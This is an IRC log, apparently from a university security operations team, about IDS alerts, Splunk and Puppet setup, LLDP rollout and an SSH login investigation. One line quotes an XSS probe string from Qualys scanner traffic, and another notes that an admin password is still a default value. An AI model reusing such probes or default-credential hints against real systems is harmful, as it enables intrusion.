2014-11-11 11:09:37	wardog	soooo... why is software.internet2.edu/rpms/el6/x86_64/main/RPMS/tcptrace-6.6.7-1.2.el6.x86_64.rpm a known bad file?
2014-11-11 11:09:59	wardog	The mail doesn't have any details on it.
2014-11-11 11:10:06	wardog	No regex or hash matching
2014-11-11 11:10:22	jazoff	hmm
2014-11-11 11:10:28	wardog	It was from the 7th
2014-11-11 11:10:37	jazoff	oh, it's because of the ptrace
2014-11-11 11:10:48	jazoff	should have the regex info though.. though I've seen that fail every now and then
2014-11-11 11:10:53	jazoff	will work on dev but not on prod
2014-11-11 11:11:02	jazoff	Regex entries:
2014-11-11 11:11:02	jazoff	[^p]ptrace,e,,2014-01-17 20:26:33.377386+00:00
2014-11-11 11:11:17	jazoff	oh, that was from a different url, btu same reason
2014-11-11 11:11:47	wardog	ah
2014-11-11 11:13:32	soehlert	ya im not entirely keen on the "known bad" especially with that name. I think we need to clean it up and/or change the name since many are regexes that hit on things different than what originally prompted its inclusion
2014-11-11 11:42:11	jazoff	yeah.. I'm not sure if it's ever found something bad
2014-11-11 11:43:06	jazoff	I think the watched subnet thing I've been working on will be more helpful in teh long run
2014-11-11 11:43:13	jazoff	as soon as all the things are whitelisted :)
2014-11-11 11:50:37	soehlert	haha ya..i think we can rip out everything but a few things (like psybnc)
2014-11-11 11:59:22	jazoff	yeah
2014-11-11 11:59:35	jazoff	i think for some boxes, especially things like web servers, alerting on ANY outbound http is more useful
2014-11-11 12:03:35	soehlert	oh absolutely, but Seth promised us that framework 3 years ago :)
2014-11-11 12:25:14	jazoff	wish I knew what was wrong with the splunk bro app
2014-11-11 12:25:27	jazoff	i think the guy that wrote it works for splunk and was at brocon
2014-11-11 12:27:09	soehlert	splunk bro app?
2014-11-11 12:27:35	jazoff	there's an addon for splunk that supposedly parses bro logs
2014-11-11 12:27:52	jazoff	based on the config it extracts the headers and renames columns and things like that
2014-11-11 12:27:59	jazoff	but it's not working 100%
2014-11-11 12:28:59	jazoff	i think it's activated at least.. the part that filters out #comments is working
2014-11-11 12:29:14	jazoff	but for whatever reason it's not adding the fields
2014-11-11 12:40:49	soehlert	ahhh gotcha didnt know that existed, that's a cool idea
2014-11-11 12:47:16	jazoff	yep, lots of ptrace hits
2014-11-11 12:57:25	jazoff	fixing the neighbor networks seems to have fixed the spam alert
2014-11-11 13:03:36	jazoff	going for a run for a bit, bbs :)
2014-11-11 13:04:02	jazoff	the south FTW
2014-11-11 13:36:04	soehlert	jazoff, eyrich. some bhr stuff in #netsec
2014-11-11 13:45:53	eyrich	let jazoff handle it
2014-11-11 13:46:38	soehlert	just about the to address in the email, but if that's better fixed by jazoff then by all means
2014-11-11 14:20:03	jazoff	wardog: http://deis.io/deis-1-0-production-ready/
2014-11-11 14:21:28	wardog	Weren't we talking about this a few months back?
2014-11-11 14:26:44	jazoff	yeah, I said it was a few months from being useful :)
2014-11-11 14:28:12	wardog	see a use for it here?
2014-11-11 14:32:11	jazoff	maybe at some point
2014-11-11 14:32:30	jazoff	the ability to just make a repo and push it somewhere to get it deployed is nice
2014-11-11 14:38:16	soehlert	is there a reason we can't push a repo to repo-sec?
2014-11-11 14:38:37	jazoff	re: deis or some other problem?
2014-11-11 14:43:31	soehlert	the make a repo and push it somewhere thing (i dont really get what you mean by that)
2014-11-11 14:45:34	jazoff	oh.. it's that after you push it RUNS the application
2014-11-11 14:45:48	jazoff	watch the video thingy on http://deis.io/overview/
2014-11-11 14:46:12	soehlert	ahhh gotcha
2014-11-11 15:00:44	soehlert	why is 149.165.228.240 (gw48.iu.xsede.org) logging into pop.ncsa.illinois.edu?
2014-11-11 15:00:54	soehlert	wardog: does that sound reasonable from the xsede side?
2014-11-11 15:01:07	jazoff	as root?
2014-11-11 15:01:11	jazoff	odd
2014-11-11 15:01:11	soehlert	yup
2014-11-11 15:01:18	wardog	it's logging in as root?
2014-11-11 15:01:22	soehlert	ya
2014-11-11 15:01:24	jazoff	using password too
2014-11-11 15:01:39	wardog	dunno. Maybe lindsey has somethign on that.
2014-11-11 15:01:42	soehlert	which is scary if it's coming from xsede
2014-11-11 15:01:52	soehlert	ok i'll forward the alert to him and ask if it's expected
2014-11-11 15:04:20	wardog	Well, doesn't look scripted.
2014-11-11 15:04:24	wardog	Only started yesterday.
2014-11-11 15:04:31	wardog	well, on a 7 day lookup
2014-11-11 15:05:11	wardog	looks like a mix of accepted and unaccepted passwords.
2014-11-11 15:05:45	soehlert	my concern is there's an xsede account that's been popped
2014-11-11 15:14:35	wardog	"Nov 10 15:54:31 pop.ncsa.uiuc.edu sshd:  succeeded"
2014-11-11 15:14:51	wardog	"Nov 10 15:54:31 pop.ncsa.uiuc.edu sshd[582]: Received signal 15; terminating."
2014-11-11 15:15:03	soehlert	immediately logging out huh?
2014-11-11 15:16:28	wardog	no, the sshd service was restarted.
2014-11-11 15:16:52	soehlert	ooo 
2014-11-11 15:17:05	wardog	Yeah, this syslog activity looks weird
2014-11-11 15:17:10	wardog	https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20host%3Dpop.ncsa.uiuc.edu%20sourcetype%3D%22syslog%22%20sshd&earliest=-30d%40d&latest=now
2014-11-11 15:32:53	wardog	looks like pop may be managed by cpond and melliot
2014-11-11 15:33:09	soehlert	oops i sent it to the wrong chris didnt i?
2014-11-11 15:35:13	wardog	no, I said lindsey
2014-11-11 15:35:21	wardog	I only just noticed the ksu stuff.
2014-11-11 15:35:28	wardog	Matt says Chris already responded.
2014-11-11 15:35:30	wardog	to you
2014-11-11 15:36:20	soehlert	you said cpond..
2014-11-11 15:36:32	wardog	I did?
2014-11-11 15:36:38	wardog	wardog> | dunno. Maybe lindsey has somethign on that.
2014-11-11 15:37:17	soehlert	i got confused here: 15:32:53   wardog | looks like pop may be managed by cpond and melliot                                                                                                                            
2014-11-11 15:37:20	wardog	But I only just now looked at ksu history that shows matt elliot and chris pond sshing to pop
2014-11-11 15:37:29	soehlert	meh doesnt matter, lindsey responded and said it is expected
2014-11-11 15:37:43	wardog	k
2014-11-11 15:37:49	soehlert	"Yes.  I opened access temporarily to that one IP.  I've been copying
2014-11-11 15:37:49	soehlert	over XSEDE list archives from 2012 onward to mhonarc.xsede.org.
2014-11-11 15:37:49	soehlert	Once the last of the archives are done copying I'll remove access."
2014-11-11 15:38:31	jazoff	but.. as root? that seems odd :)
2014-11-11 15:39:10	jazoff	i'd have just piped tar to nc and pulled it down on the other end.. asuming they are public archives anyway
2014-11-11 15:43:04	wardog	nc is unreliable.
2014-11-11 15:43:16	wardog	well, default. you can do tcp right?
2014-11-11 15:43:23	jazoff	tcp is default
2014-11-11 15:45:30	wardog	hmm. yeah, don't know if they're public.
2014-11-11 15:46:24	soehlert	well pop is im sure
2014-11-11 16:17:37	jazoff	i meant the archive not the server :)
2014-11-11 16:20:18	soehlert	ahhh haha duh
2014-11-11 16:20:33	soehlert	i knew that when you said it and then when wardog said it i unknew it..
2014-11-12 10:09:49	soehlert	oops, posted this is #puppet not here...just a heads up, i need to take a travel day friday.
2014-11-12 10:19:13	wardog	Is cif puppetized yet?
2014-11-12 10:32:25	jazoff	does not appear so
2014-11-12 10:32:53	jschipp	wardog: not yet
2014-11-12 10:32:58	jschipp	well, a lot of it is done
2014-11-12 10:33:06	jschipp	I just haven't committed it yet
2014-11-12 10:33:11	jschipp	but it's not finished
2014-11-12 10:38:24	jschipp	are all the new splunk hosts ready to be monitored with Nagios?
2014-11-12 10:41:06	jschipp	which one has the WUI for querying?
2014-11-12 10:41:12	jazoff	splunks-sec
2014-11-12 10:41:28	jazoff	they are mostly ready.. the licencing and the auth still needs to be configured
2014-11-12 10:41:33	jazoff	and need to figure out how to get syslog into it
2014-11-12 10:41:42	jazoff	can rsyslog load balance destinations?
2014-11-12 10:42:52	jschipp	I don't think it can by itself but can look
2014-11-12 10:43:32	wardog	Is the current local admin pw in lastpass?
2014-11-12 10:43:50	jazoff	it's the default changeme or mechanged
2014-11-12 10:43:58	jazoff	one of the things you do refuses to work with the default
2014-11-12 12:22:43	jschipp	planning to use SSL for Splunk WUI?
2014-11-12 12:23:01	jazoff	probably should, yeah
2014-11-12 12:23:07	jazoff	need to get a cert
2014-11-12 12:23:22	jazoff	the manager and indexers can probably use self signed certs
2014-11-12 12:25:22	wardog	splunk-sec right?
2014-11-12 12:25:28	wardog	want me to gen the csr?
2014-11-12 12:26:45	jschipp	splunks-sec
2014-11-12 12:26:47	wardog	We can issue internal.ncsa.edu certs
2014-11-12 12:28:48	jazoff	yeah, splunks-sec.internal.ncsa.edu
2014-11-12 12:28:57	wardog	where do you want the key?
2014-11-12 12:29:07	jazoff	lastpass?
2014-11-12 12:29:13	wardog	That'll work
2014-11-12 12:29:56	jazoff	i think aside from the licensing issue the new cluster should be mostly working
2014-11-12 12:30:04	jazoff	and the fact that i cant get the bro app working, which is kind of a blocker
2014-11-12 12:31:23	wardog	jazoff: did you point the index servers to the master license server?
2014-11-12 12:31:39	jazoff	not yet
2014-11-12 12:32:03	wardog	splunk-licensing.opia.illinois.edu
2014-11-12 12:32:12	jazoff	need to check the cluster docs again and see which should be configured..
2014-11-12 12:32:15	jazoff	the indexers or the master
2014-11-12 12:32:28	jazoff	i think it's just the indexers but im not sure
2014-11-12 12:41:48	wardog	I think its the indexers.
2014-11-12 12:59:44	jschipp	wardog: could you request SSL certificates for nagios-sec, nagios2-sec, and nagios-console-sec?
2014-11-12 13:00:41	wardog	I can
2014-11-12 13:00:55	wardog	2048 bit keys ok?
2014-11-12 13:01:05	jschipp	yep
2014-11-12 13:01:13	jschipp	thx
2014-11-12 13:01:51	wardog	those are all just *.internal.ncsa.edu right?
2014-11-12 13:04:43	jschipp	yeah
2014-11-12 13:08:28	soehlert	jazoff: smtp excessive shouldnt be alerting on campuscluster.illinois.edu to illinois.edu addresses right?
2014-11-12 13:12:50	jazoff	right.. I recently fixed that
2014-11-12 13:13:01	jazoff	bro-dev should nto be alerting but supercell would still be
2014-11-12 13:13:24	jazoff	oh, and that one in particular is a mailing list that just needs to be whitelisted
2014-11-12 13:13:54	jazoff	though the fix on bro-dev ignored it anyway
2014-11-12 13:14:01	jazoff	i wasn't properly ignoring mail between ncsa and cites
2014-11-12 13:14:08	wardog	jazoff: key and certificate in lastpass. search for splunks-sec
2014-11-12 13:14:09	soehlert	ahhh ok
2014-11-12 13:14:11	jazoff	ok
2014-11-12 13:14:27	jazoff	cant for the life of me figure out why the bro splunk thing is not working
2014-11-12 13:14:41	jazoff	it's ignoring headers and changing the sourcetype, so the app is kinda working
2014-11-12 13:14:46	jazoff	it's just not adding the fields
2014-11-12 13:15:19	jazoff	unless the app needs to be on teh forwarder as well
2014-11-12 13:17:00	soehlert	how do you set up where it reads from? is it a file or a stream?
2014-11-12 13:19:21	jazoff	a file
2014-11-12 13:19:42	jazoff	the splunk bro app uses this: http://docs.splunk.com/Documentation/Splunk/6.2.0/Data/Extractfieldsfromfileheadersatindextime
2014-11-12 13:19:52	jazoff	basically:
2014-11-12 13:19:52	jazoff	INDEXED_EXTRACTIONS = TSV
2014-11-12 13:19:52	jazoff	FIELD_HEADER_REGEX = ^#fields\t(.*)
2014-11-12 13:19:52	jazoff	FIELD_DELIMITER = \t
2014-11-12 13:24:37	jazoff	do we have a splunk support contact?
2014-11-12 13:24:53	jazoff	or account or however that works
2014-11-12 13:25:36	soehlert	i dont know whats going on now that our license has bounced around 30 times
2014-11-12 13:26:35	jazoff	neat: https://aws.amazon.com/kms/
2014-11-12 13:37:07	soehlert	jazoff: new bro rule for the near future, should be easy
2014-11-12 13:38:12	soehlert	going to be creating a new machine for sonexion people to do their s3cmd stuff from. basically an egress staging box for them. it should never do anything outbound except updates and when they push this stuff so if we could get a bro rule that just watches for that outbound s3 traffic and alerts us, that'd be awesome
2014-11-12 13:39:14	eyrich	i think any egress traffic that is a new outflow would be better - not just S3
2014-11-12 13:39:31	eyrich	net traffic amount outflow
2014-11-12 13:40:32	wardog	Is everyone free to meet now?
2014-11-12 13:45:37	soehlert	well right thats what i was trying to say
2014-11-12 13:45:46	soehlert	i just did a terrible job of wording it
2014-11-12 13:45:54	eyrich	yes
2014-11-12 13:45:58	soehlert	lets meet
2014-11-12 13:47:04	wardog	jazoff: 217-300-3465
2014-11-12 14:34:19	soehlert	jazoff: flows-sec is still failing puppet runs "change from nobody to root failed: Failed to set owner to '0': Operation not permitted - /data/nfdump"
2014-11-12 14:34:25	soehlert	didn't you have a fix in mind for this?
2014-11-12 14:39:55	wardog	jschipp: keys and certificates are in laspass
2014-11-12 14:39:58	wardog	for nagios certs
2014-11-12 14:40:22	wardog	soehlert: that sounds very familiar.
2014-11-12 14:43:49	jazoff	soehlert: hmm, i looked at it.. i thought i fixed it
2014-11-12 14:49:43	soehlert	been failing runs for as long as the dashboard can show
2014-11-12 14:49:56	soehlert	maybe you didnt push the fix?
2014-11-12 14:55:39	jazoff	maybe I never fixed it.. i definitely looked at it though
2014-11-12 14:56:29	soehlert	fair enough. not a huge deal, just a PSA really. 
2014-11-12 14:57:22	wardog	nfsen backend mismatch...
2014-11-12 14:57:38	jazoff	i dunno why that happens, but it goes away on its own
2014-11-12 14:57:55	soehlert	it fixes itself? it doesnt seem like it
2014-11-12 14:58:22	wardog	hey. it fixed itself.
2014-11-12 14:59:58	wardog	jazoff: ever tweak the div for nfsen when you click on a result IP? I was thinking it would be good to have a link back to ninfo and/or splunk.
2014-11-12 14:59:59	ncsabot	Error running plugin
2014-11-12 15:00:14	wardog	ncsabot: mustache me
2014-11-12 15:00:15	ncsabot	http://mustachify.me/1?src=http://vignette2.wikia.nocookie.net/despicableme/images/6/6f/Despicable-me-agnes1.jpg/revision/latest?cb=20130721202411#.png
2014-11-12 15:00:34	wardog	that did NOT work...
2014-11-12 15:00:53	soehlert	did not fix itself..
2014-11-12 15:00:58	soehlert	"Info: Applying configuration version '1415826020'
2014-11-12 15:00:58	soehlert	Error: Failed to set owner to '0': Operation not permitted - /data/nfdump
2014-11-12 15:00:58	soehlert	Error: /Stage[main]/Nfsen::Logarchive/File[/data/nfdump]/owner: change from nobody to root failed: Failed to set owner to '0': Operation not permitted - /data/nfdump
2014-11-12 15:00:58	soehlert	Error: Failed to set group to '0': Operation not permitted - /data/nfdump
2014-11-12 15:00:58	soehlert	Error: /Stage[main]/Nfsen::Logarchive/File[/data/nfdump]/group: change from nobody to root failed: Failed to set group to '0': Operation not permitted - /data/nfdump
2014-11-12 15:00:58	soehlert	Notice: /Stage[main]/Nfsen::Logarchive/Mount[/data/nfdump]: Dependency File[/data/nfdump] has failures: true
2014-11-12 15:00:58	soehlert	Warning: /Stage[main]/Nfsen::Logarchive/Mount[/data/nfdump]: Skipping because of failed dependencies"
2014-11-12 15:02:19	jazoff	wardog: yeah, I did at UA
2014-11-12 15:02:50	jazoff	soehlert: yeah.. that's annoying
2014-11-12 15:03:00	wardog	http://mustachify.me/0?src=http://www.icsi.berkeley.edu/icsi/sites/default/files/1310_BroRed_slagellandSommer.jpg#.png
2014-11-12 15:03:10	jazoff	i think i wanted it to change the owner before it was mounted, but mounting it changes it? i think it just needs to be commented out
2014-11-12 15:03:17	soehlert	so technically it finished the run but sorta not really
2014-11-12 15:03:45	soehlert	wardog: i have no idea what the first moustache has to do with anything, theres not even a moustache in there
2014-11-12 15:04:08	soehlert	the second one however, is pretty spot on
2014-11-12 15:04:50	jazoff	eyrich: do you see bro-dev on the switch?
2014-11-12 15:05:20	wardog	the first one failed.
2014-11-12 15:05:29	wardog	The second one is awesome
2014-11-12 15:05:44	wardog	jazoff: he went home.
2014-11-12 15:05:48	jazoff	h
2014-11-12 15:06:47	jazoff	grr, this lldpad in redhat is so complicated
2014-11-12 15:07:38	jazoff	lldpd that comes with debian is a bti simpler
2014-11-12 15:16:24	jazoff	sigh
2014-11-12 15:16:34	jazoff	just spent 10 minutes fighting with it.
2014-11-12 15:16:39	jazoff	on bro-dev em1 is active, NOT em0
2014-11-12 15:17:54	jazoff	[root@bro-dev ~]# lldptool get-tlv -n -i em1
2014-11-12 15:18:01	jazoff	System Description TLV
2014-11-12 15:18:01	jazoff	        Juniper Networks, Inc. ex4200-48t , version 10.4R4.5 Build date: 2011-05-06 05:55:36 UTC
2014-11-12 15:18:08	jazoff	Port Description TLV
2014-11-12 15:18:08	jazoff	        ge-0/0/42.0
2014-11-12 15:18:15	jazoff	among other things
2014-11-12 15:18:30	jazoff	System Name TLV
2014-11-12 15:18:30	jazoff	        npcf-netsec
2014-11-12 15:19:16	jazoff	so, looks pretty easy to get working
2014-11-12 15:21:23	eyrich	jazoff: I will check on the switch side in the morning
2014-11-12 15:21:49	jazoff	should see something  :)
2014-11-12 15:21:52	eyrich	ok
2014-11-12 15:22:00	jazoff	if that looks good we can work out how to get puppet to put it on all the machines
2014-11-12 15:22:33	jazoff	lldpad needs some configuration using the lldptool once you install it, annoyingly it doesnt just send/recieve lldp by default
2014-11-12 15:22:45	jazoff	has to be enabled and you have to tell it which values to send
2014-11-13 09:44:18	jazoff	wardog: we said second week of december right?
2014-11-13 09:44:29	wardog	yep
2014-11-13 09:44:36	jazoff	so 8-12
2014-11-13 09:45:45	wardog	yep
2014-11-13 10:19:46	jazoff	all set :)
2014-11-13 10:22:34	jazoff	neat https://sslmate.com/howitworks
2014-11-13 10:22:52	jazoff	something to try to emulate with that ssl project
2014-11-13 10:33:30	soehlert	that's pretty cool
2014-11-13 10:34:16	jschipp	:)
2014-11-13 11:13:45	wardog	nice
2014-11-13 11:22:12	soehlert	naming ideas for the new box to do the sonnexion exfil stuff? i don't wanna call it bw-staging as it can't do ingress staging and i dont want people to expect that and be upset when it doesn't work.
2014-11-13 11:25:23	jazoff	bw-wanxfer ?
2014-11-13 11:26:51	soehlert	i thought this said wanker at first
2014-11-13 11:29:20	jazoff	i realized that after I wrote it
2014-11-13 11:29:31	jazoff	wasnt sure if anyone else would notice, guess thats a bad idea
2014-11-13 11:29:34	jazoff	or a GOOD idea
2014-11-13 11:33:38	soehlert	haha ya..
2014-11-13 11:44:28	jazoff	bw-extxfer?
2014-11-13 11:44:38	jazoff	that looks kinda like gibberish though
2014-11-13 11:44:45	jazoff	bw-sendfile ? :)
2014-11-13 11:45:06	jazoff	bw-outbox?
2014-11-13 11:47:26	soehlert	hmm i guess sendfile or outbox will work
2014-11-13 11:56:33	wardog	bw-exfil
2014-11-13 11:56:47	wardog	bw-sonexternal
2014-11-13 11:57:00	wardog	bw-ahaha
2014-11-13 12:55:17	soehlert	i like the last one
2014-11-13 12:55:21	jazoff	wardog: splunk seems ok against the cites license server
2014-11-13 12:55:30	soehlert	exfil sounds too scary. i tihnk i'll go with outbox
2014-11-13 12:57:42	jazoff	AWS is announcing a ridiculous number of new services at their conference
2014-11-13 12:57:57	soehlert	ya i saw that
2014-11-13 12:58:35	jazoff	http://aws.amazon.com/lambda/ is the latest
2014-11-13 12:58:48	jazoff	along with http://aws.amazon.com/blogs/aws/cloud-container-management/
2014-11-13 13:02:59	wardog	jazoff: yes. Matt let me know that it's working at utilizing about 10%
2014-11-13 13:12:27	jazoff	any idea how support is handled?
2014-11-13 13:12:47	jazoff	i can probably get the bro thing working, but probably quicker for them to just tell me what is wrong
2014-11-13 13:13:36	wardog	good question. I guess you could ask Matt at CITES
2014-11-13 13:13:50	wardog	Matt Mairs
2014-11-13 13:14:53	wardog	what's up with the phalanx alerts for 141.142.148.51
2014-11-13 13:16:42	wardog	141.142.148.51 isn't listed in public_ips.txt
2014-11-13 13:17:29	jazoff	ah, I googled \026\003\001
2014-11-13 13:17:34	jazoff	aparently that is from TLS
2014-11-13 13:17:40	jazoff	so you get taht if you do https://host:22/
2014-11-13 13:18:07	wardog	what's .51 though?
2014-11-13 13:19:00	wardog	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/141.142.148.51
2014-11-13 13:19:02	jazoff	qualys?
2014-11-13 13:19:04	jazoff	yeah
2014-11-13 13:19:13	jazoff	 2014-11-12 14:42:45.000 CST qualys 141.142.148.51 fadm ssh2 publickey 
2014-11-13 13:19:21	soehlert	ya that hex is common.
2014-11-13 13:19:30	jazoff	yeah, everything in that page seems to point to qualys
2014-11-13 13:19:30	wardog	ok. well, in that case. I'll update the public_ip file
2014-11-13 13:19:34	jazoff	 <script>alert(Qualys)</script> 
2014-11-13 13:19:43	jazoff	 ZX-80 SPECTRUM 
2014-11-13 13:19:44	jazoff	lol
2014-11-13 13:22:29	soehlert	wardog: verified with icepick. its qualys
2014-11-13 13:23:05	soehlert	eyrich: http://git-scm.com/download/win
2014-11-13 13:23:44	jazoff	you can just edit things through the git-sec web interface too
2014-11-13 13:26:24	eyrich	i think the issue when i tried to update last time is that I could not log into get-sec - and then not find the project - and then I didnt care
2014-11-13 13:26:27	eyrich	:)
2014-11-13 13:31:27	soehlert	well that sounds like a jschipp thing 
2014-11-13 13:31:32	soehlert	if you cant log in that is. 
2014-11-13 13:50:28	eyrich	eyrich@npcf-netsec> show lldp neighbors
2014-11-13 13:50:28	eyrich	Local Interface    Parent Interface    Chassis Id          Port info     System Name
2014-11-13 13:50:28	eyrich	xe-1/1/2.0         ae18.0              00:24:dc:88:4f:f0   xe-1/0/6.0   core-east
2014-11-13 13:50:28	eyrich	xe-0/1/2.0         ae17.0              00:26:88:88:5d:f0   xe-1/0/6.0   core-west
2014-11-13 13:50:28	eyrich	ge-3/0/46.0        ae2.0               5c:5e:ab:63:f6:80   ge-0/0/38.0  bw-mgmt
2014-11-13 13:50:28	eyrich	ge-4/0/46.0        ae2.0               5c:5e:ab:63:f6:80   ge-0/0/39.0  bw-mgmt
2014-11-13 13:50:30	eyrich	ge-0/0/42.0        -                   f0:1f:af:d9:02:ea   Interface   2 as em1 bro-dev.internal.ncsa.edu
2014-11-13 13:50:36	jazoff	cool
2014-11-13 13:50:42	wardog	nice
2014-11-13 13:51:04	jazoff	you should be able to pull up more detail too
2014-11-13 13:51:41	jazoff	show lldp neighbors interface ge-0/0/42.0
2014-11-13 13:52:22	eyrich	wow
2014-11-13 13:52:25	eyrich	eyrich@npcf-netsec> show lldp neighbors interface ge-0/0/42.0
2014-11-13 13:52:26	eyrich	LLDP Neighbor Information:
2014-11-13 13:52:26	eyrich	Local Information:
2014-11-13 13:52:26	eyrich	Index: 44 Time to live: 120 Time mark: Thu Nov 13 19:52:05 2014 Age: 17 secs
2014-11-13 13:52:26	eyrich	Local Interface    : ge-0/0/42.0
2014-11-13 13:52:26	eyrich	Parent Interface   : -
2014-11-13 13:52:26	eyrich	Local Port ID      : 195
2014-11-13 13:52:26	eyrich	Ageout Count       : 0
2014-11-13 13:52:26	eyrich	Neighbour Information:
2014-11-13 13:52:26	eyrich	Chassis type       : Mac address
2014-11-13 13:52:26	eyrich	Chassis ID         : f0:1f:af:d9:02:ea
2014-11-13 13:52:29	eyrich	Port type          : Mac address
2014-11-13 13:52:29	eyrich	Port ID            : f0:1f:af:d9:02:ea
2014-11-13 13:52:30	eyrich	Port description   : Interface   2 as em1
2014-11-13 13:52:31	eyrich	System name        : bro-dev.internal.ncsa.edu
2014-11-13 13:52:32	eyrich	System Description : Linux bro-dev.internal.ncsa.edu 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64
2014-11-13 13:52:35	eyrich	{master:0}
2014-11-13 13:52:35	eyrich	eyrich@npcf-netsec>
2014-11-13 13:52:38	wardog	whoah
2014-11-13 13:54:32	jazoff	i turned on mngAddr
2014-11-13 13:54:35	jazoff	does the ip show up now?
2014-11-13 13:55:10	eyrich	System Description : Linux bro-dev.internal.ncsa.edu 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64
2014-11-13 13:55:10	eyrich	Management Info
2014-11-13 13:55:10	eyrich	        Type              : IPv4
2014-11-13 13:55:10	eyrich	        Address           : 10.142.148.38
2014-11-13 13:55:10	eyrich	        Port ID           : 2
2014-11-13 13:55:10	eyrich	---(more)---
2014-11-13 13:55:14	jazoff	cool
2014-11-13 13:55:30	eyrich	System Description : Linux bro-dev.internal.ncsa.edu 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64
2014-11-13 13:55:31	eyrich	Management Info
2014-11-13 13:55:31	eyrich	        Type              : IPv4
2014-11-13 13:55:31	eyrich	        Address           : 10.142.148.38
2014-11-13 13:55:31	eyrich	        Port ID           : 2
2014-11-13 13:55:31	eyrich	        Subtype           : 1
2014-11-13 13:55:31	eyrich	        Interface Subtype : ifIndex(2)
2014-11-13 13:55:31	eyrich	        OID               : 1.3.6.1.2.1.31.1.1.1.1.2
2014-11-13 13:55:31	eyrich	{master:0}
2014-11-13 13:55:31	eyrich	eyrich@npcf-netsec>
2014-11-13 14:00:44	soehlert	daaaaaaaamn
2014-11-13 14:02:32	jazoff	there's https://github.com/razorsedge/puppet-openlldp
2014-11-13 14:02:42	jazoff	which looks like it would work except you have to specify the interface
2014-11-13 14:10:33	soehlert	isnt the point that you dont have to do that sorta thing..?
2014-11-13 14:10:48	soehlert	or is that what you had to do with lldp-tool?
2014-11-13 14:13:48	jazoff	it automates the enabling of the specific fields
2014-11-13 14:13:56	jazoff	but you still need to enable it
2014-11-13 14:20:29	jazoff	openlldp::config::lldp { 'eth0':
2014-11-13 15:19:08	soehlert	jazoff: can you help me with the NTP stuff, for the life of me I can't figure out why it's not working
2014-11-13 15:19:20	soehlert	im sure i'm overlooking something dumb, but i cant find it..
2014-11-13 15:28:30	jazoff	ok
2014-11-13 15:28:33	jazoff	what's it doing/not doing?
2014-11-13 15:31:37	soehlert	not starting ntpd
2014-11-13 15:32:50	soehlert	that hiera command we worked out shows that it should be getting ntp::type ca and its in development
2014-11-13 15:32:50	soehlert	role and profile are correct
2014-11-13 15:33:29	soehlert	i removed the idea of ntp::common just to be explicit first and make sure it works.
2014-11-13 15:35:03	jazoff	if you run puppet in debug mode what does it say about ntp?
2014-11-13 15:37:14	jazoff	is it deploying the ntp.conf file?
2014-11-13 15:37:16	soehlert	i always forget thats a thing. gonna take a few minutes to parse this..
2014-11-13 15:37:29	jazoff	just search for ntp
2014-11-13 15:38:17	soehlert	oops haha Debug: /Stage[main]/Rem_users/File[/home/jbarlowtbrooksbonillajeffrdopheide]: Nothing to manage: no ensure and the resource doesn't exist
2014-11-13 15:38:57	jazoff	what did you do? lol
2014-11-13 15:39:26	soehlert	apparently messed up some sort of array there..
2014-11-13 15:39:26	soehlert	anyway, the only NTP stuff at all is just firewall rules
2014-11-13 15:39:52	jazoff	it's getting the ntp class though?
2014-11-13 15:39:56	jazoff	it is in /etc/motd?
2014-11-13 15:40:33	jazoff	ah, yeah, you have rem_users::user: [ "jbarlow", "tbrooks", "bonilla", "jeffr", "dopheide" ]
2014-11-13 15:40:56	soehlert	the rem_users part works, just not the home dir
2014-11-13 15:41:13	soehlert	Debug: /Stage[main]/Rem_users/User[jbarlow]: Nothing to manage: no ensure and the resource doesn't exist
2014-11-13 15:41:22	jazoff	ah
2014-11-13 15:41:28	soehlert	damn no it's not getting the ntp class..
2014-11-13 15:41:43	jazoff	ah, cause     user{$user: works
2014-11-13 15:41:47	jazoff	but not     file{"/home/${user}":
2014-11-13 15:42:14	soehlert	yup. i'll deal with that in a minute
2014-11-13 15:42:14	soehlert	i thought we had ntp going to all our machines..
2014-11-13 15:42:51	jazoff	physical machines
2014-11-13 15:42:52	jazoff	hieradata/development/virtual/physical.yaml
2014-11-13 15:43:15	soehlert	ahhh yes i see that now..damn i knew itd be something dumb
2014-11-13 15:44:22	jazoff	:)
2014-11-13 15:50:31	soehlert	helped adding the closing curly brace too..
2014-11-13 15:52:34	jazoff	works now? :)
2014-11-13 15:53:27	soehlert	yup
2014-11-13 15:53:27	soehlert	thanks
2014-11-14 12:28:37	jazoff	ah, I think I am over thinking the lldp thing
2014-11-14 12:29:05	jazoff	not sure what it does if an interface doesnt exist, if nothing bad happens we could just have a 
2014-11-14 12:29:08	jazoff	openlldp::config::lldp { 'eth0'
2014-11-14 12:29:09	jazoff	openlldp::config::lldp { 'eth1'
2014-11-14 12:29:10	jazoff	etc
2014-11-14 12:29:39	jazoff	actually, $interfaces in facter has the list
2014-11-14 12:36:51	wardog	sam and jon are out today.
2014-11-14 12:47:53	jazoff	eyrich: you around?
2014-11-14 12:48:00	eyrich	jazoff: yes
2014-11-14 12:49:36	jazoff	workign on getting more boxes doing lldp
2014-11-14 13:10:07	jazoff	there it goes
2014-11-14 13:10:22	jazoff	eyrich: do you see more boxes now?
2014-11-14 13:10:36	eyrich	no
2014-11-14 13:10:58	eyrich	ge-0/0/42.0        -                   f0:1f:af:d9:02:ea   Interface   2 as em1 bro-dev.internal.ncsa.edu
2014-11-14 13:11:05	jazoff	hmm
2014-11-14 13:16:13	jazoff	eyrich: now?
2014-11-14 13:16:29	eyrich	ge-0/0/39.0        -                   f0:1f:af:d8:e9:5a   Interface   2 as em1 nids-dev3.internal.ncsa.edu
2014-11-14 13:16:30	eyrich	ge-0/0/41.0        -                   f0:1f:af:d8:e9:6a   Interface   2 as em1 nids-dev1.internal.ncsa.edu
2014-11-14 13:16:30	eyrich	ge-0/0/42.0        -                   f0:1f:af:d9:02:ea   Interface   2 as em1 bro-dev.internal.ncsa.edu
2014-11-14 13:16:30	eyrich	ge-0/0/40.0        -                   f0:1f:af:d9:03:02   Interface   2 as em1 nids-dev2.internal.ncsa.edu
2014-11-14 13:16:33	jazoff	cool
2014-11-14 13:19:11	jazoff	hmm, that appears to have made teh giamon links not happy
2014-11-14 13:20:08	eyrich	ya - i can see where the sniffer drivers would not like you try and send traffic
2014-11-14 13:20:31	jazoff	well this is on bro-dev and they are the regular intel cards
2014-11-14 13:20:48	eyrich	right
